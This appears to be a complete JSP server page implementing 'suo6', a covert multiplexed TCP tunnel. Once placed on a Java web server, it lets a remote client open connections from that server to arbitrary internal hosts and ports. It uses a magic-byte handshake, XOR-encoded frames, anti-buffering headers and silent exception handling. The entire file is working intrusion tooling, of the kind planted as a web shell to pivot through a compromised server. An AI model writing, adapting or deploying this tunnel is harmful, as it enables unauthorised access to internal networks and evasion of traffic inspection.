<%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="java.security.SecureRandom" %><%@ page import="java.util.*" %><%@ page import="java.util.concurrent.*" %><%!
    /**
     * suo6 — multiplexed binary tunnel (standalone JSP edition).
     * Frame: [stream_id:2B BE][type:1B][length:2B BE][payload:length B]
     * Types: 0x01=OPEN 0x02=OPEN_ACK 0x03=DATA 0x04=FIN 0x05=PING
     *
     * XOR encoding is done ONLY in the writer thread (dequeue order) so the
     * stream-cipher byte positions always match the HTTP response byte order.
     */
    public static class Suo6 implements Runnable {

        private static final byte T_OPEN     = 0x01;
        private static final byte T_OPEN_ACK = 0x02;
        private static final byte T_DATA     = 0x03;
        private static final byte T_FIN      = 0x04;
        private static final byte T_PING     = 0x05;

        // multi-role fields (_mode selects behaviour in run())
        // 1 = writer thread   2 = socket-reader thread   3 = connector thread
        int           _mode;
        byte[]        _key;
        int[]         _s2cPos;   // owned exclusively by writer thread
        BlockingDeque _s2cQ;
        boolean[]     _done;
        Map           _streams;
        OutputStream  _httpOut;  // mode-1 only
        int           _streamId; // mode-2/3
        Socket        _sock;     // mode-2
        String        _host;     // mode-3
        int           _port;     // mode-3

        // ── entry point ────────────────────────────────────────────────
        public void handleConn(HttpServletRequest req, HttpServletResponse resp) throws Exception {
            InputStream  httpIn  = req.getInputStream();
            OutputStream httpOut = resp.getOutputStream();

            try { resp.setBufferSize(0); } catch (Exception ignored) {}
            resp.setHeader("X-Accel-Buffering", "no");
            resp.setHeader("Cache-Control",    "no-cache, no-store");
            resp.setContentType("application/octet-stream");

            // Handshake: read [0x53 0x36 0x00 0x01][client_seed:16B]
            byte[] magic = new byte[4]; readFull(httpIn, magic);
            if (magic[0] != 0x53 || magic[1] != 0x36 || magic[2] != 0x00 || magic[3] != 0x01) return;
            byte[] clientSeed = new byte[16]; readFull(httpIn, clientSeed);

            byte[] serverSeed = new byte[16]; new SecureRandom().nextBytes(serverSeed);
            byte[] key = new byte[16];
            for (int i = 0; i < 16; i++) key[i] = (byte)(clientSeed[i] ^ serverSeed[i]);

            // Handshake reply: [0x53 0x36 0x00 0x01][server_seed:16B]
            httpOut.write(new byte[]{0x53, 0x36, 0x00, 0x01});
            httpOut.write(serverSeed);
            httpOut.flush();
            try { resp.flushBuffer(); } catch (Exception ignored) {}

            // Session state
            BlockingDeque s2cQ    = new LinkedBlockingDeque();
            Map           streams = new Hashtable();
            boolean[]     done    = {false};
            int[]         s2cPos  = {0};
            int[]         c2sPos  = {0};

            // Start writer thread (mode 1)
            Suo6 writer = new Suo6();
            writer._mode    = 1;
            writer._s2cQ    = s2cQ;
            writer._done    = done;
            writer._httpOut = httpOut;
            writer._key     = key;
            writer._s2cPos  = s2cPos;
            Thread wt = new Thread(writer, "s6-w");
            wt.setDaemon(true);
            wt.start();

            // c2s frame-read loop
            byte[] hdr = new byte[5];
            try {
                while (!done[0]) {
                    if (!readFullOrEof(httpIn, hdr)) break;
                    for (int i = 0; i < 5; i++) hdr[i] ^= key[c2sPos[0]++ & 15];

                    int  sid = ((hdr[0] & 0xff) << 8) | (hdr[1] & 0xff);
                    byte typ = hdr[2];
                    int  len = ((hdr[3] & 0xff) << 8) | (hdr[4] & 0xff);

                    byte[] payload = new byte[len];
                    if (len > 0) {
                        readFull(httpIn, payload);
                        for (int i = 0; i < len; i++) payload[i] ^= key[c2sPos[0]++ & 15];
                    }

                    switch (typ) {
                        case T_PING:
                            enqueueFirst(s2cQ, buildFrameRaw(0, T_PING, new byte[0]));
                            break;
                        case T_OPEN: {
                            if (len < 3) break;
                            final int fSid  = sid;
                            final int port  = ((payload[0] & 0xff) << 8) | (payload[1] & 0xff);
                            final String host = new String(payload, 2, len - 2, "UTF-8");
                            Suo6 conn = new Suo6();
                            conn._mode     = 3;
                            conn._streamId = fSid;
                            conn._host     = host;
                            conn._port     = port;
                            conn._streams  = streams;
                            conn._s2cQ     = s2cQ;
                            conn._done     = done;
                            Thread ct = new Thread(conn, "s6-c" + fSid);
                            ct.setDaemon(true);
                            ct.start();
                            break;
                        }
                        case T_DATA: {
                            Socket sock = (Socket) streams.get(new Integer(sid));
                            if (sock != null && !sock.isClosed() && len > 0) {
                                try {
                                    sock.getOutputStream().write(payload);
                                    sock.getOutputStream().flush();
                                } catch (Exception e) {
                                    doClose(sid, streams, s2cQ, done);
                                }
                            }
                            break;
                        }
                        case T_FIN:
                            doClose(sid, streams, s2cQ, done);
                            break;
                    }
                }
            } finally {
                done[0] = true;
                for (Object v : streams.values())
                    try { ((Socket) v).close(); } catch (Exception ignored) {}
                streams.clear();
                try { s2cQ.putFirst(new byte[0]); } catch (Exception ignored) {}
                try { wt.join(3000); } catch (Exception ignored) {}
            }
        }

        // ── Runnable: writer (1), socket-reader (2), connector (3) ────
        public void run() {
            if (_mode == 1) {
                try {
                    while (!_done[0]) {
                        Object o = _s2cQ.poll(5, TimeUnit.SECONDS);
                        if (o == null) continue;
                        byte[] f = (byte[]) o;
                        if (f.length == 0) break;
                        xorEncode(f, _key, _s2cPos);
                        _httpOut.write(f);
                        for (int i = 0; i < 31; i++) {
                            o = _s2cQ.poll();
                            if (o == null) break;
                            f = (byte[]) o;
                            if (f.length == 0) { _httpOut.flush(); _done[0] = true; return; }
                            xorEncode(f, _key, _s2cPos);
                            _httpOut.write(f);
                        }
                        _httpOut.flush();
                    }
                } catch (Exception ignored) {
                } finally {
                    _done[0] = true;
                }

            } else if (_mode == 2) {
                byte[] buf = new byte[8 * 1024];
                try {
                    InputStream in = _sock.getInputStream();
                    int n;
                    while (!_done[0] && (n = in.read(buf)) != -1) {
                        byte[] p = new byte[n];
                        System.arraycopy(buf, 0, p, 0, n);
                        enqueue(_s2cQ, buildFrameRaw(_streamId, T_DATA, p));
                    }
                } catch (Exception ignored) {
                } finally {
                    if (!_done[0]) enqueueFirst(_s2cQ, buildFrameRaw(_streamId, T_FIN, new byte[0]));
                    try { _sock.close(); } catch (Exception ignored) {}
                }

            } else if (_mode == 3) {
                Socket sock = null;
                try {
                    sock = new Socket();
                    sock.setTcpNoDelay(true);
                    sock.setReceiveBufferSize(256 * 1024);
                    sock.setSendBufferSize(256 * 1024);
                    sock.connect(new InetSocketAddress(_host, _port), 10000);
                } catch (Exception e) {
                    enqueueFirst(_s2cQ, buildFrameRaw(_streamId, T_OPEN_ACK, new byte[]{0x01}));
                    if (sock != null) try { sock.close(); } catch (Exception ignored) {}
                    return;
                }
                _streams.put(new Integer(_streamId), sock);
                enqueueFirst(_s2cQ, buildFrameRaw(_streamId, T_OPEN_ACK, new byte[]{0x00}));
                _mode = 2;
                _sock = sock;
                run();
            }
        }

        // ── helpers ────────────────────────────────────────────────────
        private static byte[] buildFrameRaw(int sid, byte typ, byte[] payload) {
            byte[] f = new byte[5 + payload.length];
            f[0] = (byte)((sid >> 8) & 0xff);
            f[1] = (byte)(sid & 0xff);
            f[2] = typ;
            f[3] = (byte)((payload.length >> 8) & 0xff);
            f[4] = (byte)(payload.length & 0xff);
            if (payload.length > 0) System.arraycopy(payload, 0, f, 5, payload.length);
            return f;
        }

        private static void xorEncode(byte[] frame, byte[] key, int[] pos) {
            for (int i = 0; i < frame.length; i++) frame[i] ^= key[pos[0]++ & 15];
        }

        private static void doClose(int sid, Map streams, BlockingDeque q, boolean[] done) {
            Socket s = (Socket) streams.remove(new Integer(sid));
            if (s != null) try { s.close(); } catch (Exception ignored) {}
            if (!done[0]) enqueueFirst(q, buildFrameRaw(sid, T_FIN, new byte[0]));
        }

        private static void enqueue(BlockingDeque q, byte[] f) {
            try { q.put(f); } catch (Exception ignored) {}
        }

        private static void enqueueFirst(BlockingDeque q, byte[] f) {
            try { q.putFirst(f); } catch (Exception ignored) {}
        }

        private static void readFull(InputStream in, byte[] buf) throws IOException {
            int off = 0;
            while (off < buf.length) {
                int n = in.read(buf, off, buf.length - off);
                if (n < 0) throw new IOException("EOF");
                off += n;
            }
        }

        private static boolean readFullOrEof(InputStream in, byte[] buf) throws IOException {
            int b = in.read();
            if (b < 0) return false;
            buf[0] = (byte) b;
            int off = 1;
            while (off < buf.length) {
                int n = in.read(buf, off, buf.length - off);
                if (n < 0) throw new IOException("EOF mid-frame");
                off += n;
            }
            return true;
        }
    }
%><%
    try { new Suo6().handleConn(request, response); } catch (Exception ignored) {}
    try { out.clear(); } catch (Exception e) {}
    out = pageContext.pushBody();
%>
